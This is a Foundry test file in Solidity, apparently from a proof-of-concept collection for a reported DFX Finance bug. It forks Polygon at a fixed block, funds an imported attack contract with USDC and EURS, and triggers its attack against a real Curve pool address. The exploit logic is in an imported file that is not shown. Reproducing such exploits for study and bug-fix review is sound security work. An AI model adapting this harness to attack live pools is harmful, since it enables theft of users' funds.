// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../pocs/DFXFinanceBugfixReview.sol";
import "../../src/PoC.sol";

contract DFXFinanceBugfixReviewTest is PoC {
    DFXFinanceBugfixReview attackContract;
    IERC20[] tokens;
    ICurve constant curve_pool = ICurve(0x2385D7aB31F5a470B1723675846cb074988531da);
    IERC20 EURS = IERC20(0xE111178A87A3BFf0c8d18DECBa5798827539Ae99);

    function setUp() public {
        vm.createSelectFork("polygon", 42064500);

        attackContract = new DFXFinanceBugfixReview();
        tokens.push(PolygonTokens.USDC);
        tokens.push(EURS);

        // Deal tokens to attacker
        deal(PolygonTokens.USDC, address(attackContract), 100 * 1e6);
        deal(EURS, address(attackContract), 100 * 1e2);

        setAlias(address(curve_pool), "curve_pool");
        setAlias(address(attackContract), "Attacker");

        console.log("\n>>> Initial conditions");
    }

    function testAttack() public snapshot(address(attackContract), tokens) snapshot(address(curve_pool), tokens) {
        attackContract.initiateAttack();
    }
}
